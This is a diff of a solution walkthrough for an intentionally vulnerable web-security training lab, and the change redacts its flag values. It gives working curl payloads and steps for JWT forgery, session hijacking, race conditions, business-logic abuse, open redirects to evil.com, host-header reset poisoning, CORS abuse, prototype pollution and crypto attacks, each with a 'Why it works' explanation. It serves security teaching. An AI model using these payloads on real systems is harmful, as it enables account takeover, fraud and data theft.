 server verifies your token against a secret you control.
 
-**4. Untrusted jku Key Server** – `PENTRIX{jwt_jku}`
+**4. Untrusted jku Key Server** – `PENTRIX{...}`
 
 First publish your own key on the in-lab attacker key server. At
 `/jwt/attacker-keys`, register kid `evil` with secret `evilsecret` (the page then
@@ -1743,7 +1745,7 @@ Submit it at `/jwt/jku`. (Adjust the host/port in `jku` to match your run.)
 Why it works: the verifier fetches any `jku` URL with no allowlist and trusts
 the keys it finds, so pointing it at your own key server hands you the signing key.
 
-**5. RS256 / HS256 Algorithm Confusion** – `PENTRIX{jwt_alg-confusion}`
+**5. RS256 / HS256 Algorithm Confusion** – `PENTRIX{...}`
 
 Copy the RSA public key from `/jwt/confusion-pubkey`. When the server sees
 `alg: HS256` it uses the public key bytes as the HMAC secret, and the public key
@@ -1766,7 +1768,7 @@ Submit it at `/jwt/confusion`.
 Why it works: the server confuses an asymmetric public key with a symmetric HMAC
 secret, so the published public key becomes a valid signing key for HS256 tokens.
 
-**6. Expiry Never Checked** – `PENTRIX{jwt_no-expiry}`
+**6. Expiry Never Checked** – `PENTRIX{...}`
 
 Copy the expired admin token shown on `/jwt/noexpiry` (it expired an hour ago)
 and paste it into the form on the same page unchanged.
@@ -1774,7 +1776,7 @@ and paste it into the form on the same page unchanged.
 Why it works: the verifier passes `ignoreExpiration`, so the `exp` claim is
 never enforced and a leaked old token replays forever.
 
-**7. Audience Not Validated** – `PENTRIX{jwt_aud-bypass}`
+**7. Audience Not Validated** – `PENTRIX{...}`
 
 Copy the partner token from `/jwt/aud`. It carries `"aud": "billing-service"` and
 `role: admin`. Submit it at the same page's login form.
@@ -1782,7 +1784,7 @@ Copy the partner token from `/jwt/aud`. It carries `"aud": "billing-service"` an
 Why it works: the server verifies the signature but never checks the `aud`
 claim, so a token minted for a different service is accepted here.
 
-**8. Default Key for Missing kid** – `PENTRIX{jwt_kid-default}`
+**8. Default Key for Missing kid** – `PENTRIX{...}`
 
 Tokens without a `kid` header fall back to the hardcoded default key `test`.
 Sign a kid-less admin token with it:
@@ -1801,7 +1803,7 @@ anyone who guesses it can mint valid tokens without a `kid` at all.
 
 ## session – Session Management
 
-**1. Session Fixation** – `PENTRIX{session_fixation}`
+**1. Session Fixation** – `PENTRIX{...}`
 
 Fix the session id before login, then log in as `admin` / `admin123`:
 
@@ -1816,7 +1818,7 @@ The login response shows the flag and the cookie is still `attacker123`.
 Why it works: the server keeps the pre-login session id instead of regenerating
 it at login, so an attacker-chosen id becomes the victim's authenticated session.
 
-**2. Logout Does Not Destroy the Session** – `PENTRIX{session_logout}`
+**2. Logout Does Not Destroy the Session** – `PENTRIX{...}`
 
 ```
 curl -c jar -b jar --data-urlencode "username=admin" --data-urlencode "password=admin123" \
@@ -1830,7 +1832,7 @@ The secret page still opens after logout and shows the flag.
 Why it works: logout only flips a flag on the server-side session instead of
 deleting it, so the old cookie keeps working.
 
-**3. Predictable Session IDs** – `PENTRIX{session_predictable}`
+**3. Predictable Session IDs** – `PENTRIX{...}`
 
 ```
 curl -c jar http://localhost:3000/session/predictable
@@ -1849,7 +1851,7 @@ curl -b <(printf 'localhost\tFALSE\t/\tFALSE\t0\tlab_sid\t1001\n') \
 Why it works: session ids are sequential integers, so the admin's session id is
 trivially guessable from your own.
 
-**4. Session ID in the URL** – `PENTRIX{session_url}`
+**4. Session ID in the URL** – `PENTRIX{...}`
 
 Visit `/session/urldemo` (this also seeds the admin's visit), then read the
 proxy log at `/session/urldemo/proxy-log` and find the admin's URL:
@@ -1867,7 +1869,7 @@ curl "http://localhost:3000/session/urldemo/home?sid=<admin-sid-from-log>"
 Why it works: putting the sid in the URL leaks it into logs, and anyone who can
 read the proxy log can replay the admin's session.
 
-**5. Sessions Never Expire** – `PENTRIX{session_never-expires}`
+**5. Sessions Never Expire** – `PENTRIX{...}`
 
 Open `/session/legacy-archive` and copy the decade-old admin session id. Set it
 as your `lab_sid` cookie and visit the legacy panel:
@@ -1880,7 +1882,7 @@ curl -b <(printf 'localhost\tFALSE\t/\tFALSE\t0\tlab_sid\t<archived-sid>\n') \
 Why it works: sessions live for 10 years, so a stolen session from a decade ago
 is still accepted.
 
-**6. Session ID in Debug Log** – `PENTRIX{session_log-leak}`
+**6. Session ID in Debug Log** – `PENTRIX{...}`
 
 Open `/session/debug-log` and find the line `admin session started sid=<id>`.
 Replay it as your cookie:
@@ -1896,7 +1898,7 @@ handing the admin's session to anyone who looks.
 
 ## race – Race Conditions
 
-**1. Single-Use Coupon Redeemed Twice** – `PENTRIX{race_race-coupon}`
+**1. Single-Use Coupon Redeemed Twice** – `PENTRIX{...}`
 The coupon page redeems coupon RACE10 ($10 credit, one use). One click redeems it
 once; twenty at the same instant redeem it many times:
 ```
@@ -1909,7 +1911,7 @@ Why it works: the "already used?" check and the "mark used" write are separated
 by an async pause, so parallel requests all read `used=false` before any write
 lands (time-of-check to time-of-use).
 
-**2. Double-Spend the Balance** – `PENTRIX{race_race-balance}`
+**2. Double-Spend the Balance** – `PENTRIX{...}`
 The wallet holds $100. Fire 20 parallel transfers of the full $100:
 ```
 curl -s http://localhost:3000/race/reset -o /dev/null
@@ -1921,7 +1923,7 @@ Why it works: every request passes the `balance >= amount` check against the
 same starting balance before any debit is applied, so the wallet spends money it
 never had.
 
-**3. Vote Counted Twice** – `PENTRIX{race_race-vote}`
+**3. Vote Counted Twice** – `PENTRIX{...}`
 The poll allows one vote per name. Two votes for the same name, sent in
 parallel, both get recorded:
 ```
@@ -1933,7 +1935,7 @@ rejected with "Already voted"; only the parallel pair races.)
 Why it works: the duplicate-name check and the vote insert are separated by an
 async pause, so both requests pass the check before either insert happens.
 
-**4. Referral Bonus Claimed Twice** – `PENTRIX{race_race-referral}`
+**4. Referral Bonus Claimed Twice** – `PENTRIX{...}`
 Referral code REF2026 pays 50 points, claimable once. Claim it 10 times in
 parallel:
 ```
@@ -1944,7 +1946,7 @@ Reload `/race/referral`: claims and points are multiples of the single bonus.
 Why it works: the "already claimed?" check races the claim write across the
 async gap, so concurrent claims each see an unclaimed code.
 
-**5. Duplicate Username Registration** – `PENTRIX{race_race-register}`
+**5. Duplicate Username Registration** – `PENTRIX{...}`
 Usernames must be unique. Register the same name twice in parallel:
 ```
 curl -s http://localhost:3000/race/reset -o /dev/null
@@ -1955,7 +1957,7 @@ registration is correctly rejected with "Username taken".)
 Why it works: the uniqueness check and the insert are separated by an async
 pause, so both registrations pass the check before either row is inserted.
 
-**6. Beat the AV Scan (TOCTOU)** – `PENTRIX{race_race-upload-scan}`
+**6. Beat the AV Scan (TOCTOU)** – `PENTRIX{...}`
 Uploads are served immediately but a simulated AV scan deletes each file 2
 seconds later. Upload, then fetch within the window:
 ```
@@ -1968,7 +1970,7 @@ Why it works: the file is servable the instant it is stored while the delete
 only runs later, a classic time-of-check to time-of-use gap between "stored" and
 "scanned".
 
-**7. Burst Through the Rate Limit** – `PENTRIX{race_race-ratelimit}`
+**7. Burst Through the Rate Limit** – `PENTRIX{...}`
 The API allows 5 requests per window. The counter increments only after an async
 gap, so a parallel burst all reads the old counter:
 ```
@@ -1981,7 +1983,7 @@ Why it works: the "under the limit?" check runs before the async pause and the
 increment after it, so every request in the burst passes the check against a
 stale counter.
 
-**8. Oversell the Stock** – `PENTRIX{race_race-stock}`
+**8. Oversell the Stock** – `PENTRIX{...}`
 Only 5 gadgets in stock. Order 5 twice, in parallel:
 ```
 curl -s http://localhost:3000/race/reset -o /dev/null
@@ -1996,7 +1998,7 @@ pause, so both orders see the pre-sale stock of 5 and both go through.
 
 ## bizlogic – Business Logic Flaws
 
-**1. Negative Quantity Credit** – `PENTRIX{bizlogic_biz-negative-qty}`
+**1. Negative Quantity Credit** – `PENTRIX{...}`
 The checkout computes `$50 x qty` with no validation. Order -1 hoodies:
 ```
 POST /bizlogic/negative-qty
@@ -2007,7 +2009,7 @@ and the flag is awarded.
 Why it works: a negative quantity turns the total negative, and subtracting a
 negative total adds money instead of taking it.
 
-**2. Client-Side Price Tampering** – `PENTRIX{bizlogic_biz-price-tamper}`
+**2. Client-Side Price Tampering** – `PENTRIX{...}`
 The buy form carries the price in a hidden field (`price=50`) and the server
 charges whatever the browser sends:
 ```
@@ -2018,7 +2020,7 @@ The $50 hoodie is bought for $1.00.
 Why it works: the price is taken from client input and never re-checked against
 the product catalog, so any submitted price is honored.
 
-**3. Coupon Stacking Past 100%** – `PENTRIX{bizlogic_biz-coupon-stack}`
+**3. Coupon Stacking Past 100%** – `PENTRIX{...}`
 Three coupons are each "one per order": SAVE50, SAVE40, SAVE30. The discount
 math adds every valid code with no cap:
 ```
@@ -2029,7 +2031,7 @@ Total discount is 120%, the $50 hoodie costs -$10, and the shop pays you.
 Why it works: percentages stack additively without a 100% ceiling, so combined
 coupons drive the total at or below zero.
 
-**4. OTP Verified by JavaScript** – `PENTRIX{bizlogic_biz-otp-client}`
+**4. OTP Verified by JavaScript** – `PENTRIX{...}`
 The page JavaScript checks the OTP and sets a hidden `otp_ok=1` field; the
 server only looks at that field. Skip the JavaScript entirely:
 ```
@@ -2042,7 +2044,7 @@ Why it works: verification happens in the browser, which the attacker controls;
 the server trusts the client-supplied `otp_ok` flag instead of checking the code
 itself.
 
-**5. Checkout Step Skipped** – `PENTRIX{bizlogic_biz-workflow-skip}`
+**5. Checkout Step Skipped** – `PENTRIX{...}`
 Checkout is cart, then payment, then confirm, but each step is just an endpoint
 and confirm never verifies payment ran. Add to cart, then confirm directly:
 ```
@@ -2055,7 +2057,7 @@ The order is confirmed with "Payment step completed: false": a free hoodie.
 Why it works: the confirm handler enforces no ordering of the workflow steps,
 so the payment step can be skipped by calling the endpoint directly.
 
-**6. Currency Confusion** – `PENTRIX{bizlogic_biz-currency}`
+**6. Currency Confusion** – `PENTRIX{...}`
 The $50 total is denominated in USD, but the server accepts any currency label
 for that number and converts at face value:
 ```
@@ -2066,7 +2068,7 @@ The $50 order settles as 50 JPY (about $0.34).
 Why it works: a USD-denominated amount is accepted under a foreign currency
 label with no real conversion, so the buyer chooses the cheapest currency.
 
-**7. Email Change Without Re-Authentication** – `PENTRIX{bizlogic_biz-email-noreauth}`
+**7. Email Change Without Re-Authentication** – `PENTRIX{...}`
 The account email can be changed with no password confirmation, and
 forgot-password sends the reset link to whatever address is on file:
 ```
@@ -2081,7 +2083,7 @@ new password: full account takeover, flag awarded.
 Why it works: changing the email needs no re-authentication, so the attacker
 reroutes the account's recovery channel to themselves and resets the password.
 
-**8. Tampered Refund Amount** – `PENTRIX{bizlogic_biz-refund}`
+**8. Tampered Refund Amount** – `PENTRIX{...}`
 Buy the $50 hoodie, then refund it. The refund form carries the amount in a
 hidden field that the server never clamps to what was paid:
 ```
@@ -2098,7 +2100,7 @@ looked up from the order, so any amount can be refunded.
 
 ## redirect - Open Redirect
 
-**1. Protocol-Relative Redirect** - `PENTRIX{redirect_redirect-double-slash}`
+**1. Protocol-Relative Redirect** - `PENTRIX{...}`
 
 ```bash
 curl -i "http://127.0.0.1:3109/redirect/go?next=//evil.com"
@@ -2110,7 +2112,7 @@ Why it works: the `next` parameter is passed to the redirect with zero
 validation, and a URL starting with `//` keeps the current scheme but navigates
 to the attacker's host.
 
-**2. javascript: Scheme Honored** - `PENTRIX{redirect_redirect-javascript}`
+**2. javascript: Scheme Honored** - `PENTRIX{...}`
 
 ```bash
 curl -i "http://127.0.0.1:3109/redirect/js?next=javascript:alert(1)"
@@ -2121,7 +2123,7 @@ curl -i "http://127.0.0.1:3109/redirect/js?next=javascript:alert(1)"
 Why it works: the endpoint sets the `Location` header from user input with no
 scheme allowlist, so a `javascript:` URL is honored verbatim.
 
-**3. data: Scheme Honored** - `PENTRIX{redirect_redirect-data}`
+**3. data: Scheme Honored** - `PENTRIX{...}`
 
 ```bash
 curl -i "http://127.0.0.1:3109/redirect/data?next=data:text/html,%3Cscript%3Ealert(1)%3C/script%3E"
@@ -2132,7 +2134,7 @@ curl -i "http://127.0.0.1:3109/redirect/data?next=data:text/html,%3Cscript%3Eale
 Why it works: same missing scheme check as lab 2; a `data:text/html` URL
 smuggles a whole attacker-controlled document through the redirect.
 
-**4. Backslash Allowlist Bypass** - `PENTRIX{redirect_redirect-backslash}`
+**4. Backslash Allowlist Bypass** - `PENTRIX{...}`
 
 ```bash
 curl -i "http://127.0.0.1:3109/redirect/trusted?next=https:%5C%5Cevil.com"
@@ -2147,7 +2149,7 @@ Why it works: the naive allowlist compares the raw string prefix instead of the
 parsed hostname and accepts backslash as a separator, while browsers and the
 URL parser normalize `\` to `/`, so the real destination is evil.com.
 
-**5. OAuth Code Theft via redirect_uri** - `PENTRIX{redirect_redirect-oauth-theft}`
+**5. OAuth Code Theft via redirect_uri** - `PENTRIX{...}`
 
 Full chain (the victim is simulated with a cookie jar):
 
@@ -2173,7 +2175,7 @@ Why it works: `redirect_uri` is never validated against the client's registered
 URLs, so the authorization code is delivered to the attacker's collector, where
 it can be exchanged for an access token.
 
-**6. Parameter Pollution Picks Last** - `PENTRIX{redirect_redirect-pollution}`
+**6. Parameter Pollution Picks Last** - `PENTRIX{...}`
 
 ```bash
 curl -i "http://127.0.0.1:3109/redirect/polluted?next=safe&next=https://evil.com"
@@ -2187,7 +2189,7 @@ last value; the first one is only camouflage for anyone reviewing the link.
 
 ## hostheader - Host Header Injection
 
-**1. Password Reset Poisoning** - `PENTRIX{hostheader_host-reset-poison}`
+**1. Password Reset Poisoning** - `PENTRIX{...}`
 
 ```bash
 B=http://127.0.0.1:3109
@@ -2201,7 +2203,7 @@ curl -s "$B/hostheader/evil-collect?token=$TOKEN" | grep -o "PENTRIX{[^}]*}"
 Why it works: the reset link is built from the untrusted `Host` header, so the
 victim's valid token is delivered to the attacker's domain.
 
-**2. Cache Poisoning via Host** - `PENTRIX{hostheader_host-cache-poison}`
+**2. Cache Poisoning via Host** - `PENTRIX{...}`
 
 ```bash
 B=http://127.0.0.1:3109
@@ -2216,7 +2218,7 @@ curl -s "$B/hostheader/app/clear" -o /dev/null
 Why it works: the portal page is cached by path alone, so the copy rendered
 under the attacker's `Host` is served to every later visitor.
 
-**3. SSRF via Host Header** - `PENTRIX{hostheader_host-ssrf}`
+**3. SSRF via Host Header** - `PENTRIX{...}`
 
 ```bash
 curl -s -H "Host: 127.0.0.1:13919" http://127.0.0.1:3109/hostheader/status \
@@ -2228,7 +2230,7 @@ Why it works: the server-side health check builds its fetch URL from the `Host`
 header, so pointing it at `127.0.0.1:13919` makes the server fetch the
 loopback-only internal monitoring agent and return its secrets.
 
-**4. X-Forwarded-Host Poisoning** - `PENTRIX{hostheader_host-xforwarded}`
+**4. X-Forwarded-Host Poisoning** - `PENTRIX{...}`
 
 ```bash
 B=http://127.0.0.1:3109
@@ -2240,7 +2242,7 @@ curl -s "$B/hostheader/evil-collect?token=$TOKEN" | grep -o "PENTRIX{[^}]*}"
 Why it works: behind a proxy this reset page trusts `X-Forwarded-Host` over
 `Host`; same poisoning, different header.
 
-**5. X-Host-Override Poisoning** - `PENTRIX{hostheader_host-override}`
+**5. X-Host-Override Poisoning** - `PENTRIX{...}`
 
 ```bash
 B=http://127.0.0.1:3109
@@ -2252,7 +2254,7 @@ curl -s "$B/hostheader/evil-collect?token=$TOKEN" | grep -o "PENTRIX{[^}]*}"
 Why it works: a vendor-specific variant of the same flaw; `X-Host-Override`
 wins over `Host` when building the reset link.
 
-**6. Absolute Continue URL** - `PENTRIX{hostheader_host-abs-url}`
+**6. Absolute Continue URL** - `PENTRIX{...}`
 
 ```bash
 curl -i -H "Host: evil.com" --data "username=alice&password=alice123" \
@@ -2270,7 +2272,7 @@ attacker's domain.
 
 ## cors - CORS Misconfiguration
 
-**1. Reflected Origin with Credentials** - `PENTRIX{cors_cors-reflect}`
+**1. Reflected Origin with Credentials** - `PENTRIX{...}`
 
 ```bash
 curl -s "http://127.0.0.1:3109/cors/prove?vuln=cors-reflect&origin=https%3A%2F%2Fevil.com" \
@@ -2283,7 +2285,7 @@ curl -s "http://127.0.0.1:3109/cors/prove?vuln=cors-reflect&origin=https%3A%2F%2
 Why it works: the endpoint reflects any `Origin` with credentials allowed and
 no allowlist at all, so any website can read authenticated responses.
 
-**2. Null Origin Trusted** - `PENTRIX{cors_cors-null}`
+**2. Null Origin Trusted** - `PENTRIX{...}`
 
 ```bash
 curl -s "http://127.0.0.1:3109/cors/prove?vuln=cors-null&origin=null" \
@@ -2295,7 +2297,7 @@ curl -s "http://127.0.0.1:3109/cors/prove?vuln=cors-null&origin=null" \
 Why it works: `Origin: null` (sandboxed iframes, file:// pages) is trusted with
 credentials, handing the data to attacker-controlled null-origin contexts.
 
-**3. Regex Allowlist Bypass** - `PENTRIX{cors_cors-regex}`
+**3. Regex Allowlist Bypass** - `PENTRIX{...}`
 
 ```bash
 curl -s "http://127.0.0.1:3109/cors/prove?vuln=cors-regex&origin=https%3A%2F%2Fpentrix.lab.evil.com" \
@@ -2308,7 +2310,7 @@ being under pentrix.lab. (Note: the commonly written anchored form
 `^https://.*\.pentrix\.lab$` would NOT match this payload - the missing dot
 before `pentrix` and the missing `$` are exactly the naive mistakes.)
 
-**4. Wildcard on Sensitive Data** - `PENTRIX{cors_cors-wildcard-data}`
+**4. Wildcard on Sensitive Data** - `PENTRIX{...}`
 
 ```bash
 curl -s "http://127.0.0.1:3109/cors/prove?vuln=cors-wildcard-data&origin=https%3A%2F%2Fevil.com" \
@@ -2320,7 +2322,7 @@ curl -s "http://127.0.0.1:3109/cors/prove?vuln=cors-wildcard-data&origin=https%3
 Why it works: a wildcard origin on an endpoint returning sensitive user data
 means literally any website can read it.
 
-**5. Subdomain Suffix Check** - `PENTRIX{cors_cors-subdomain}`
+**5. Subdomain Suffix Check** - `PENTRIX{...}`
 
 ```bash
 curl -s "http://127.0.0.1:3109/cors/prove?vuln=cors-subdomain&origin=https%3A%2F%2Fevil.trusted.pentrix.lab" \
@@ -2331,7 +2333,7 @@ Why it works: the check is only `hostname.endsWith('.trusted.pentrix.lab')`
 with no allowlist of real subdomains, so an attacker-controlled subdomain
 passes.
 
-**6. Exposed Admin Token Header** - `PENTRIX{cors_cors-expose-headers}`
+**6. Exposed Admin Token Header** - `PENTRIX{...}`
 
 ```bash
 curl -s "http://127.0.0.1:3109/cors/prove?vuln=cors-expose-headers&origin=https%3A%2F%2Fevil.com" \
@@ -2347,104 +2349,104 @@ with JavaScript.
 
 ## proto – Prototype Pollution
 
-**1. Query-String Pollution** – `PENTRIX{proto_proto-query}`
+**1. Query-String Pollution** – `PENTRIX{...}`
 1. Merge the payload (brackets URL-encoded for curl):
    `curl -c jar -b jar "http://localhost:3000/proto/query?__proto__%5Brole%5D=admin"`
 2. Open the admin check in the same session:
    `curl -c jar -b jar "http://localhost:3000/proto/query/admin"`
-   The page prints `PENTRIX{proto_proto-query}`.
+   The page prints `PENTRIX{...}`.
 Why it works: the nested query parser keeps `__proto__` as a real key and the naive `merge()` walks it straight onto `Object.prototype`, so a brand-new `{}` inherits `role = 'admin'`.
 
-**2. JSON Body Pollution** – `PENTRIX{proto_proto-json}`
+**2. JSON Body Pollution** – `PENTRIX{...}`
 1. POST a JSON body with a literal `__proto__` key:
    `curl -c jar -b jar -X POST http://localhost:3000/proto/json/merge -H 'Content-Type: application/json' -d '{"__proto__": {"role": "admin"}}'`
-2. `curl -c jar -b jar http://localhost:3000/proto/json/admin` prints `PENTRIX{proto_proto-json}`.
+2. `curl -c jar -b jar http://localhost:3000/proto/json/admin` prints `PENTRIX{...}`.
 Why it works: `JSON.parse` creates an own property literally named `__proto__`, and the merge copies it onto `Object.prototype` with no key filtering.
 
-**3. Blacklist Bypass via constructor** – `PENTRIX{proto_proto-constructor}`
+**3. Blacklist Bypass via constructor** – `PENTRIX{...}`
 1. The merge drops any key containing the literal string `__proto__`. Take the other entrance to the prototype chain:
    `curl -c jar -b jar "http://localhost:3000/proto/constructor?constructor%5Bprototype%5D%5Brole%5D=admin"`
-2. `curl -c jar -b jar http://localhost:3000/proto/constructor/admin` prints `PENTRIX{proto_proto-constructor}`.
+2. `curl -c jar -b jar http://localhost:3000/proto/constructor/admin` prints `PENTRIX{...}`.
 Why it works: `constructor.prototype` reaches the very same `Object.prototype`, and the blacklist only blocks the literal `__proto__` spelling, so the merge pollutes through the back door.
 
-**4. Polluting toString** – `PENTRIX{proto_proto-dos}`
+**4. Polluting toString** – `PENTRIX{...}`
 1. `curl "http://localhost:3000/proto/dos?__proto__%5BtoString%5D=boom"`
-2. The response is the crash page ("The widget broke") containing `PENTRIX{proto_proto-dos}`.
+2. The response is the crash page ("The widget broke") containing `PENTRIX{...}`.
 Why it works: `__proto__[toString]=boom` merges the string `"boom"` into the widget's per-request prototype scope, so the page's `` `${widget}` `` coercion calls a non-function `toString` and throws; the crash handler awards the flag.
 
-**5. Client-Side Pollution** – `PENTRIX{proto_proto-client}`
+**5. Client-Side Pollution** – `PENTRIX{...}`
 1. Open `http://localhost:3000/proto/client?__proto__[theme]=dark` in a real browser.
-2. The page's in-browser parser + naive merge pollutes `Object.prototype` in that page, the theme box renders `dark` (read from a fresh `{}`), and the page auto-reports to `/proto/client/claim?theme=dark`, which prints `PENTRIX{proto_proto-client}`.
+2. The page's in-browser parser + naive merge pollutes `Object.prototype` in that page, the theme box renders `dark` (read from a fresh `{}`), and the page auto-reports to `/proto/client/claim?theme=dark`, which prints `PENTRIX{...}`.
 Why it works: the vulnerable merge runs in the victim's browser, so a `__proto__[theme]` query parameter changes what every fresh object in the page reads; the page itself reports the demonstrated value to the claim endpoint.
 (Verified by executing the page's exact script with a simulated DOM: a fresh `{}` read `theme = 'dark'` and the script built the claim redirect.)
 
-**6. Unicode Escape Bypass** – `PENTRIX{proto_proto-unicode-bypass}`
+**6. Unicode Escape Bypass** – `PENTRIX{...}`
 1. The merge endpoint rejects raw bodies containing the literal string `__proto__` (400). Smuggle it as JSON escapes, sent as `text/plain` so the server sees your exact bytes:
    `curl -c jar -b jar -X POST http://localhost:3000/proto/unicode/merge -H 'Content-Type: text/plain' --data-binary '{"\u005f\u005fproto\u005f\u005f": {"role": "admin"}}'`
    The response says "Blacklist passed".
-2. `curl -c jar -b jar http://localhost:3000/proto/unicode/admin` prints `PENTRIX{proto_proto-unicode-bypass}`.
+2. `curl -c jar -b jar http://localhost:3000/proto/unicode/admin` prints `PENTRIX{...}`.
 Why it works: the blacklist scans the raw text, but `JSON.parse` decodes `\u005f` escapes after the scan, so the forbidden `__proto__` key materializes inside the merge.
 ---
 
 ## crypto – Cryptographic Failures
 
-**1. Predictable Reset PIN** – `PENTRIX{crypto_crypto-rand-pin}`
+**1. Predictable Reset PIN** – `PENTRIX{...}`
 1. `curl -c jar -b jar -X POST http://localhost:3000/crypto/pin/generate`
-2. Brute-force `000000`-`999999` against `POST /crypto/pin/verify` with `pin=<guess>` as a form field. There is no rate limiting. A script with 100 concurrent keep-alive connections found the PIN in about 72 seconds (206,469 guesses, roughly 2,800 requests/second); the winning response contains `PENTRIX{crypto_crypto-rand-pin}`.
+2. Brute-force `000000`-`999999` against `POST /crypto/pin/verify` with `pin=<guess>` as a form field. There is no rate limiting. A script with 100 concurrent keep-alive connections found the PIN in about 72 seconds (206,469 guesses, roughly 2,800 requests/second); the winning response contains `PENTRIX{...}`.
 Why it works: the PIN comes from `Math.random`, which is not a CSPRNG, and a 6-digit space with no lockout is trivially enumerable by script.
 
-**2. ECB Decryption Oracle** – `PENTRIX{crypto_crypto-ecb-oracle}`
+**2. ECB Decryption Oracle** – `PENTRIX{...}`
 1. Find the block size: `POST /crypto/ecb/encrypt` with `inhex=` set to `41` repeated N times. The hex ciphertext (in `<code id="ct">`) grows from 32 to 48 bytes at a 4-byte prefix, so the block size is 16. (Careful: when prefix + secret exactly fills a block, PKCS#7 appends a full pad block, which also grows the ciphertext.)
 2. Confirm ECB: encrypt 48 identical bytes (`41` x 48 as hex); the ciphertext shows three identical 16-byte blocks.
 3. Find the secret length: first growth at prefix 4, and a disambiguation probe at prefix 19 still returns 48 bytes (not 64), so the length is 28, not 29.
 4. Decrypt byte-at-a-time: for byte `i`, send a prefix of `15 - (i mod 16)` bytes so the unknown byte lands at the end of block `floor(i/16)`. Build a dictionary of that block's ciphertext for all 256 possible last-byte values (`prefix || known || guess`), then look up the block from the prefix-only query. Repeat for all 28 bytes.
-5. `POST /crypto/ecb/solve` with `plaintext=<recovered secret>`. The attack recovered `O0R6LQSmrFzKTjqy996nBOUrCxQ=` (28 bytes; the secret is random per boot) and the response contained `PENTRIX{crypto_crypto-ecb-oracle}`.
+5. `POST /crypto/ecb/solve` with `plaintext=<recovered secret>`. The attack recovered `O0R6LQSmrFzKTjqy996nBOUrCxQ=` (28 bytes; the secret is random per boot) and the response contained `PENTRIX{...}`.
 Why it works: ECB encrypts identical plaintext blocks to identical ciphertext blocks, so attacker-controlled prefix bytes can align each unknown secret byte to a block boundary and identify it by dictionary comparison.
 
-**3. CBC Bit-Flipping** – `PENTRIX{crypto_crypto-cbc-bitflip}`
+**3. CBC Bit-Flipping** – `PENTRIX{...}`
 1. `curl -c jar -b jar -X POST http://localhost:3000/crypto/cbc/login` and copy the base64 cookie from `<code id="ck">`.
 2. Decode it: the first 16 bytes are the IV, the rest is `AES-128-CBC(iv, '{"role":"guest","user":"guest"}')`. The string `"guest"` (the role value) sits at plaintext bytes 9-13, directly under the IV.
 3. Flip the IV bytes over it: `iv[9+i] ^= 'guest'[i] ^ 'admin'[i]` for `i` in 0..4. Reassemble `base64(new_iv || ciphertext)`.
-4. `curl -c jar -b jar -X POST http://localhost:3000/crypto/cbc/check --data-urlencode "cookie=<forged>"`. The server decrypts it, sees `role = 'admin'`, and prints `PENTRIX{crypto_crypto-cbc-bitflip}`.
+4. `curl -c jar -b jar -X POST http://localhost:3000/crypto/cbc/check --data-urlencode "cookie=<forged>"`. The server decrypts it, sees `role = 'admin'`, and prints `PENTRIX{...}`.
 Why it works: CBC decryption XORs each block with the previous ciphertext block (or IV), so IV bit flips cause predictable plaintext bit flips, and the cookie has no integrity check (no MAC) to reject the tampering.
 
-**4. Hash Length Extension** – `PENTRIX{crypto_crypto-hash-ext}`
+**4. Hash Length Extension** – `PENTRIX{...}`
 1. `GET /crypto/mac/sign?msg=role%3Duser` returns `{"msg": "role=user", "mac": "<sha256 hex>"}`. The page states the secret is 16 bytes, and the signer refuses any message containing `admin`.
 2. In pure code (a from-scratch SHA-256 with injectable initial state; no new dependencies), take the returned MAC as the compression state. Build the glue padding for a 25-byte prefix (16 secret + 9 message bytes): `0x80`, zeros, then the 64-bit big-endian bit length.
 3. Forged message = `role=user || glue || ;admin=1` (hex-encode it as `msghex`). Forged MAC = continue SHA-256 from the leaked state over `;admin=1 || padding-for-72-bytes`.
-4. `POST /crypto/mac/verify` with `msghex=<hex>` and `mac=<forged hex>`. The response contains `PENTRIX{crypto_crypto-hash-ext}`.
+4. `POST /crypto/mac/verify` with `msghex=<hex>` and `mac=<forged hex>`. The response contains `PENTRIX{...}`.
 Why it works: SHA-256 is Merkle-Damgard, so its digest is the entire internal state; anyone holding one valid MAC can append data and compute a valid MAC for the longer message without ever learning the secret.
 
-**5. Crack the MD5** – `PENTRIX{crypto_crypto-md5-crack}`
+**5. Crack the MD5** – `PENTRIX{...}`
 1. Read the leaked hash from `/crypto/md5` (it is `0571749e2ac330a7455809c6b0e7af90`, fixed per lab design).
 2. Fetch `/crypto/md5/wordlist.txt` and MD5 each of the 48 candidates until one matches: the password is `sunshine`.
-3. `curl -c jar -b jar -X POST http://localhost:3000/crypto/md5/login --data-urlencode "username=demo" --data-urlencode "password=sunshine"`. The login succeeds and prints `PENTRIX{crypto_crypto-md5-crack}`.
+3. `curl -c jar -b jar -X POST http://localhost:3000/crypto/md5/login --data-urlencode "username=demo" --data-urlencode "password=sunshine"`. The login succeeds and prints `PENTRIX{...}`.
 Why it works: an unsalted, fast MD5 of a dictionary word falls to an offline dictionary attack in milliseconds.
 
-**6. Base64 "Encryption"** – `PENTRIX{crypto_crypto-b64-cookie}`
+**6. Base64 "Encryption"** – `PENTRIX{...}`
 1. `curl -c jar -b jar -X POST http://localhost:3000/crypto/b64/login` and copy the cookie from `<code id="ck">`.
 2. Decode it: `echo '<cookie>' | base64 -d` gives `{"user":"guest","role":"user"}`. Change `"role":"user"` to `"role":"admin"` and re-encode with base64.
-3. `curl -c jar -b jar -X POST http://localhost:3000/crypto/b64/check --data-urlencode "cookie=<re-encoded>"`. The response prints `PENTRIX{crypto_crypto-b64-cookie}`.
+3. `curl -c jar -b jar -X POST http://localhost:3000/crypto/b64/check --data-urlencode "cookie=<re-encoded>"`. The response prints `PENTRIX{...}`.
 Why it works: the "encryption" was only base64 encoding, which is trivially reversible, and the server trusts whatever decodes to valid JSON.
 
-**7. XOR Crib Dragging** – `PENTRIX{crypto_crypto-xor-crib}`
+**7. XOR Crib Dragging** – `PENTRIX{...}`
 1. Copy the ciphertext hex from `<code id="ct">` on `/crypto/xor`.
 2. The page tells you every document starts with the 9-byte header `{"user":"`. For each candidate key length 1-12: derive `key[i mod L] = ct[i] XOR crib[i]` over the crib, decrypt the full ciphertext, and keep the length that yields valid JSON. (Length 8 wins; the key and token are random per boot. One run recovered key `aa9bf2fdf48bd86d` and plaintext `{"user":"guest","token":"6a6a86ab2543cd2d"}`.)
-3. `POST /crypto/xor/solve` with `plaintext=<recovered JSON>`. The response contains `PENTRIX{crypto_crypto-xor-crib}`.
+3. `POST /crypto/xor/solve` with `plaintext=<recovered JSON>`. The response contains `PENTRIX{...}`.
 Why it works: a short repeating XOR key turns known plaintext into known keystream, so the crib exposes the key bytes and the rest of the message decrypts.
 
-**8. Key in JavaScript** – `PENTRIX{crypto_crypto-key-in-js}`
+**8. Key in JavaScript** – `PENTRIX{...}`
